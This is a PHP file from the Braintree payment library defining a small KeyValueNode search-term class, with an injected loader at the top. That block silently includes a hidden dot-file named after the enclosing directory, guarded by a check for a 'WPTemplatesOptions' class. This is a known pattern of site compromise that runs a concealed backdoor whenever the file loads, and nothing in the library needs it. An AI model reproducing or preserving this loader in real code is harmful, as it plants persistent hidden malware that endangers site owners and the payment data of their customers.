<?php
namespace Braintree;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class KeyValueNode
{
    public function __construct($name)
    {
        $this->name = $name;
        $this->searchTerm = True;
    }

    public function is($value)
    {
        $this->searchTerm = $value;
        return $this;
    }

    public function toParam()
    {
        return $this->searchTerm;
    }
}
class_alias('Braintree\KeyValueNode', 'Braintree_KeyValueNode');
